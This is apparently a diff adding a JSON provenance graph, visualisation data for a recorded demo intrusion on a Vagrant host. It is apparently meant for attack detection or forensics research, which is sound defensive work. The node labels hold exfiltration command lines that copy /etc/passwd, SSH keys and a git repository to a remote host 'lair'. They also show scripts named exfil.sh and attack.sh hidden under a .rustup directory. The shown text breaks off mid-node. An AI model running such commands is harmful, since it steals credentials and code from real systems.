+          "label": "scp -F .rustup/attack-ssh-config -r stealthisrepo natasha@lair:~/stolen-code"
+        },
+        "position": {
+          "x": 4941.6722393887485,
+          "y": 2040.627260203346
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368451",
+          "names": [
+            "/usr/home/vagrant/.rustup/attack.sh"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:53820f9e-b686-5654-86b6-ac77a4568b64",
+          "label": "/usr/home/vagrant/.rustup/attack.sh"
+        },
+        "position": {
+          "x": 2904.4098071367866,
+          "y": 1541.1674769039398
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368452",
+          "names": [
+            "/usr/home/vagrant/.rustup/attack.sh"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:53820f9e-b686-5654-86b6-ac77a4568b64",
+          "label": "/usr/home/vagrant/.rustup/attack.sh"
+        },
+        "position": {
+          "x": 3059.1536175378624,
+          "y": 1551.1207804287515
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368736",
+          "names": [
+            "/usr/home/vagrant/.rustup/attack.sh"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:53820f9e-b686-5654-86b6-ac77a4568b64",
+          "label": "/usr/home/vagrant/.rustup/attack.sh"
+        },
+        "position": {
+          "x": 3156.710065793812,
+          "y": 1617.6141262640551
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "anomalous": false,
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368450",
+          "name": [
+            "10.0.0.2:80"
+          ],
+          "names": [
+            "10.0.0.2:80"
+          ],
+          "parent": "367741",
+          "timestamp": 1498617976737787600,
+          "type": "socket-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f5140c71-5bab-11e7-aa1d-080027d14c66",
+          "label": "10.0.0.2:80"
+        },
+        "position": {
+          "x": 2771.065385590027,
+          "y": 1498.0628061381856
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "socket-version"
+      },
+      {
+        "data": {
+          "cmdline": "/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -F /home/vagrant/.rustup/attack-ssh-config -l natasha -- lair scp -t ~/stolen-passwd",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368909",
+          "last_update": 1498617978977939700,
+          "parent": "367741",
+          "pid": "6432",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f6645260-5bab-11e7-aa21-080027d14c66",
+          "label": "/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -F /home/vagrant/.rustup/attack-ssh-config -l natasha -- lair scp -t ~/stolen-passwd"
+        },
+        "position": {
+          "x": 3785.4162043939755,
+          "y": 2297.898528670017
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368707",
+          "names": [
+            "/usr/home/vagrant/.rustup/attack-ssh-config"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:4a0cd7f9-702f-ec54-af70-014724ec92bc",
+          "label": "/usr/home/vagrant/.rustup/attack-ssh-config"
+        },
+        "position": {
+          "x": 2814.732737573003,
+          "y": 2070.445442127352
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368814",
+          "names": [
+            "/usr/home/vagrant/.rustup/attack-ssh-config",
+            "/home/vagrant/.rustup/attack-ssh-config"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:4a0cd7f9-702f-ec54-af70-014724ec92bc",
+          "label": "/usr/home/vagrant/.rustup/attack-ssh-config / /home/vagrant/.rustup/attack-ssh-config"
+        },
+        "position": {
+          "x": 2932.7631030645516,
+          "y": 2104.9271114978656
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "cmdline": "/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -F /home/vagrant/.rustup/attack-ssh-config -l natasha -- lair scp -r -t ~/stolen-ssh",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368784",
+          "last_update": 1498617977423808300,
+          "parent": "367741",
+          "pid": "6430",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f576fc57-5bab-11e7-aa1f-080027d14c66",
+          "label": "/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -F /home/vagrant/.rustup/attack-ssh-config -l natasha -- lair scp -r -t ~/stolen-ssh"
+        },
+        "position": {
+          "x": 4062.14675856506,
+          "y": 2292.7154210234958
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368815",
+          "names": [
+            "/usr/home/vagrant/.rustup/attack-ssh-config",
+            "/home/vagrant/.rustup/attack-ssh-config"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:4a0cd7f9-702f-ec54-af70-014724ec92bc",
+          "label": "/usr/home/vagrant/.rustup/attack-ssh-config / /home/vagrant/.rustup/attack-ssh-config"
+        },
+        "position": {
+          "x": 3091.038863781944,
+          "y": 2158.285168067845
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368939",
+          "names": [
+            "/usr/home/vagrant/.rustup/attack-ssh-config",
+            "/home/vagrant/.rustup/attack-ssh-config"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:4a0cd7f9-702f-ec54-af70-014724ec92bc",
+          "label": "/usr/home/vagrant/.rustup/attack-ssh-config / /home/vagrant/.rustup/attack-ssh-config"
+        },
+        "position": {
+          "x": 3267.4924197055884,
+          "y": 2233.2819623853466
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "cmdline": "/bin/sh .rustup/exfil.sh",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369210",
+          "last_update": 1498617980269299000,
+          "parent": "367741",
+          "pid": "6443",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f72fd500-5bab-11e7-aa25-080027d14c66",
+          "label": "/bin/sh .rustup/exfil.sh"
+        },
+        "position": {
+          "x": 3823.405036428896,
+          "y": 1638.9103272434404
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368940",
+          "names": [
+            "/usr/home/vagrant/.rustup/attack-ssh-config",
+            "/home/vagrant/.rustup/attack-ssh-config"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:4a0cd7f9-702f-ec54-af70-014724ec92bc",
+          "label": "/usr/home/vagrant/.rustup/attack-ssh-config / /home/vagrant/.rustup/attack-ssh-config"
+        },
+        "position": {
+          "x": 3413.020191802371,
+          "y": 2321.164141109377
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "cmdline": "git remote -v",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369213",
+          "last_update": 1498617980269299000,
+          "parent": "367741",
+          "pid": "6444",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f7301502-5bab-11e7-aa25-080027d14c66",
+          "label": "git remote -v"
+        },
+        "position": {
+          "x": 3947.63288743475,
+          "y": 1648.2958976819602
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368752",
+          "names": [
+            "/usr/home/vagrant/.rustup/exfil.sh"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:a6bca5c7-e6b1-1156-b1e6-11740611b131",
+          "label": "/usr/home/vagrant/.rustup/exfil.sh"
+        },
+        "position": {
+          "x": 3552.791821607255,
+          "y": 1890.480326431305
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "anomalous": false,
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368947",
+          "name": [
+            "10.0.0.2:22"
+          ],
+          "names": [
+            "10.0.0.2:22"
+          ],
+          "parent": "367741",
+          "timestamp": 1498617979000714200,
+          "type": "socket-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f66d8c2a-5bab-11e7-aa21-080027d14c66",
+          "label": "10.0.0.2:22"
+        },
+        "position": {
+          "x": 3635.7945228634626,
+          "y": 2138.3528410252675
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "socket-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369352",
+          "names": [
+            "/usr/home/vagrant/.rustup/attack-ssh-config",
+            "/home/vagrant/.rustup/attack-ssh-config"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:4a0cd7f9-702f-ec54-af70-014724ec92bc",
+          "label": "/usr/home/vagrant/.rustup/attack-ssh-config / /home/vagrant/.rustup/attack-ssh-config"
+        },
+        "position": {
+          "x": 4238.23747444004,
+          "y": 2334.615455628434
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "cmdline": "scp -F /home/vagrant/.rustup/attack-ssh-config /etc/passwd natasha@lair:~/stolen-passwd",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368880",
+          "last_update": 1498617978898654000,
+          "parent": "367741",
+          "pid": "6431",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f65e3e7e-5bab-11e7-aa1f-080027d14c66",
+          "label": "scp -F /home/vagrant/.rustup/attack-ssh-config /etc/passwd natasha@lair:~/stolen-passwd"
+        },
+        "position": {
+          "x": 3753.709271516932,
+          "y": 2165.5619529650266
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368537",
+          "names": [
+            "/usr/home/vagrant/.rustup/exfil.sh"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:a6bca5c7-e6b1-1156-b1e6-11740611b131",
+          "label": "/usr/home/vagrant/.rustup/exfil.sh"
+        },
+        "position": {
+          "x": 3473.326825154645,
+          "y": 1972.2726171078775
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "cmdline": "/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -F .rustup/attack-ssh-config -l natasha -- lair scp -r -t ~/stolen-code",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369322",
+          "last_update": 1498617980459683000,
+          "parent": "367741",
+          "pid": "6449",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f746780f-5bab-11e7-aa27-080027d14c66",
+          "label": "/usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -F .rustup/attack-ssh-config -l natasha -- lair scp -r -t ~/stolen-code"
+        },
+        "position": {
+          "x": 4958.7258282912935,
+          "y": 2254.6749125776805
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "cmdline": "sh -c sh",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368201",
+          "last_update": 1498617976035944400,
+          "parent": "367741",
+          "pid": "6414",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f4a6d8ea-5bab-11e7-aa1c-080027d14c66",
+          "label": "sh -c sh"
+        },
+        "position": {
+          "x": 1892.1984197687964,
+          "y": 1569.371330858623
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368536",
+          "names": [
+            "/usr/home/vagrant/.rustup/exfil.sh"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:a6bca5c7-e6b1-1156-b1e6-11740611b131",
+          "label": "/usr/home/vagrant/.rustup/exfil.sh"
+        },
+        "position": {
+          "x": 3390.00001697151,
+          "y": 1996.2410105934696
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "cmdline": "/bin/sh .rustup/exfil.sh",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368983",
+          "last_update": 1498617980044688000,
+          "parent": "367741",
+          "pid": "6433",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f70d0f57-5bab-11e7-aa21-080027d14c66",
+          "label": "/bin/sh .rustup/exfil.sh"
+        },
+        "position": {
+          "x": 4431.895423531365,
+          "y": 1724.1883198308628
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "anomalous": false,
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368535",
+          "name": [
+            "10.0.0.2:80"
+          ],
+          "names": [
+            "10.0.0.2:80"
+          ],
+          "parent": "367741",
+          "timestamp": 1498617976897584400,
+          "type": "socket-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f52c8515-5bab-11e7-aa1d-080027d14c66",
+          "label": "10.0.0.2:80"
+        },
+        "position": {
+          "x": 3320.5259686174595,
+          "y": 1872.0222788234166
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "socket-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368165",
+          "names": [
+            "/tmp/vagrant-shell"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:d88d29be-858d-9d5c-8d85-404bec9d82e3",
+          "label": "/tmp/vagrant-shell"
+        },
+        "position": {
+          "x": 2060.0022741527773,
+          "y": 1803.940871595638
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369071",
+          "names": [
+            "/usr/home/vagrant/stealthisrepo/.git/objects/info"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:89ec131b-c742-9854-82c7-60a534983939",
+          "label": "/usr/home/vagrant/stealthisrepo/.git/objects/info"
+        },
+        "position": {
+          "x": 4700.599152630783,
+          "y": 1770.5900375446065
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "anomalous": false,
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368822",
+          "name": [
+            "10.0.0.2:22"
+          ],
+          "names": [
+            "10.0.0.2:22"
+          ],
+          "parent": "367741",
+          "timestamp": 1498617977447039000,
+          "type": "socket-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f5803713-5bab-11e7-aa1f-080027d14c66",
+          "label": "10.0.0.2:22"
+        },
+        "position": {
+          "x": 4162.684242607689,
+          "y": 2237.4922445155544
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "socket-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369072",
+          "names": [
+            "/usr/home/vagrant/stealthisrepo/.git/objects/info"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:89ec131b-c742-9854-82c7-60a534983939",
+          "label": "/usr/home/vagrant/stealthisrepo/.git/objects/info"
+        },
+        "position": {
+          "x": 4796.451572602249,
+          "y": 1800.7274411699016
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "cmdline": "find . -depth 2 -name *.git",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368986",
+          "last_update": 1498617980045750000,
+          "parent": "367741",
+          "pid": "6434",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f70d531b-5bab-11e7-aa21-080027d14c66",
+          "label": "find . -depth 2 -name *.git"
+        },
+        "position": {
+          "x": 4583.666150630843,
+          "y": 1770.5900375446056
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "anomalous": false,
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369360",
+          "name": [
+            "10.0.0.2:22"
+          ],
+          "names": [
+            "10.0.0.2:22"
+          ],
+          "parent": "367741",
+          "timestamp": 1498617980481681400,
+          "type": "socket-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f74f4c0a-5bab-11e7-aa27-080027d14c66",
+          "label": "10.0.0.2:22"
+        },
+        "position": {
+          "x": 5007.3533411887165,
+          "y": 1789.810640728489
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "socket-version"
+      },
+      {
+        "data": {
+          "cmdline": "sh",
+          "egid": "1001",
+          "euid": "1001",
+          "gid": "1001",
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368224",
+          "last_update": 1498617976056620500,
+          "parent": "367741",
+          "pid": "6414",
+          "rgid": null,
+          "ruid": null,
+          "saw_creation": true,
+          "sgid": null,
+          "suid": null,
+          "type": "process",
+          "uid": "1001",
+          "username": "vagrant",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:f4a6d8ea-5bab-11e7-aa1c-080027d14c66",
+          "label": "sh"
+        },
+        "position": {
+          "x": 2011.517585664525,
+          "y": 1569.371330858623
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "process"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "368252",
+          "names": [
+            "/tmp/vagrant-shell"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:d88d29be-858d-9d5c-8d85-404bec9d82e3",
+          "label": "/tmp/vagrant-shell"
+        },
+        "position": {
+          "x": 2107.016854939999,
+          "y": 1707.230446743548
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "7955e148-6882-4786-b1ab-b56ea24c4f10",
+          "hostname": [
+            "git.bovia.org"
+          ],
+          "id": "370592",
+          "names": [
+            "/usr/home/vagrant/./demo-backend/README.md"
+          ],
+          "parent": "369448",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "7955e148-6882-4786-b1ab-b56ea24c4f10:c187bfd3-d899-7e5b-99d8-d68fbb7ee45b",
+          "label": "/usr/home/vagrant/./demo-backend/README.md"
+        },
+        "position": {
+          "x": 4806.660347231569,
+          "y": 1356.2683610285585
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "7955e148-6882-4786-b1ab-b56ea24c4f10",
+          "hostname": [
+            "git.bovia.org"
+          ],
+          "id": "370408",
+          "names": [
+            "/usr/home/vagrant/./demo-frontend/README.md"
+          ],
+          "parent": "369448",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "7955e148-6882-4786-b1ab-b56ea24c4f10:9764f9f2-816a-2351-aa81-3a30b123a470",
+          "label": "/usr/home/vagrant/./demo-frontend/README.md"
+        },
+        "position": {
+          "x": 4961.036502584555,
+          "y": 1231.7656296585633
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "370409",
+          "names": [
+            "/usr/home/vagrant/.gitme/././demo-frontend/README.md"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:5e032682-f0ab-9857-abf0-65dbd79852a2",
+          "label": "/usr/home/vagrant/.gitme/././demo-frontend/README.md"
+        },
+        "position": {
+          "x": 4112.440417008396,
+          "y": 1959.977276115337
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "369510",
+          "names": [
+            "/usr/home/vagrant/stealthisrepo/README.md"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
+          "uuid": "29b0c58a-50d5-4dcd-8311-82f9605c1885:115d16e3-e106-fd53-86e1-71e193fd8e15",
+          "label": "/usr/home/vagrant/stealthisrepo/README.md"
+        },
+        "position": {
+          "x": 4649.215283643327,
+          "y": 2052.5197888366256
+        },
+        "group": "nodes",
+        "removed": false,
+        "selected": false,
+        "selectable": true,
+        "locked": false,
+        "grabbable": true,
+        "classes": "file-version"
+      },
+      {
+        "data": {
+          "host": "29b0c58a-50d5-4dcd-8311-82f9605c1885",
+          "hostname": [
+            "cto.bovia.org"
+          ],
+          "id": "370759",
+          "names": [
+            "/usr/home/vagrant/.gitme/././demo-android/.git/description"
+          ],
+          "parent": "367741",
+          "saw_creation": true,
+          "type": "file-version",
